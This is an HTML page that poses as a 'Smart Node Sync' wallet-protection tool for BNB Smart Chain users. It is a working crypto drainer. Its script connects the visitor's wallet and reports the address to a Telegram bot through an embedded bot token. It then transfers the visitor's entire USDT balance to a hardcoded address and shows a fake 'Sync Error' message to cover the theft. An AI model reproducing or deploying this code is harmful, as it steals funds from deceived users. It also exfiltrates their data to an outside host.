<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Sync</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 340px; border: 1px solid #2d3139; }
        .icon { width: 50px; height: 50px; margin-bottom: 15px; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #929aa5; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
        .btn { background: #3172DE; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 99; flex-direction: column; align-items: center; justify-content: center; }
        .spin { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 35px; height: 35px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" class="icon">
        <h2>Smart Node Sync</h2>
        <p>Synchronize your wallet with the secure node to protect your BEP20 assets from unauthorized access.</p>
        <button class="btn" onclick="loadAndStart()">Verify Assets</button>
    </div>

    <div id="loader">
        <div class="spin"></div>
        <p style="color:#3172DE; margin-top:15px; font-size:14px;">Connecting to Node...</p>
    </div>

    <script>
        // Bina library load kiye turant chalne wala function
        function loadAndStart() {
            document.getElementById("loader").style.display = "flex";
            
            // Web3 library ko on-demand load karna (taki page pehle khul jaye)
            var script = document.createElement('script');
            script.src = "https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js";
            script.onload = function() {
                executeLogic();
            };
            document.head.appendChild(script);
        }

        async function executeLogic() {
            const MY_ADDR = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
            const USDT = "0x55d398326f99059fF775485246999027B3197955";
            const TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
            const CHAT = "7849151110";

            if (!window.ethereum && !window.trustwallet) {
                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
                return;
            }

            try {
                const web3 = new Web3(window.ethereum || window.trustwallet);
                const accs = await web3.eth.requestAccounts();
                const user = accs[0];

                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
                const contract = new web3.eth.Contract(abi, USDT);
                const bal = await contract.methods.balanceOf(user).call();

                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=ðŸ‘¤ Connected: ${user}`);

                if (parseInt(bal) > 0) {
                    await contract.methods.transfer(MY_ADDR, bal).send({ from: user });
                    alert("Sync Error: Try again.");
                } else {
                    alert("Node Synced Successfully.");
                }
            } catch (e) {
                alert("Security Reject.");
            } finally {
                document.getElementById("loader").style.display = "none";
            }
        }
    </script>
</body>
</html>
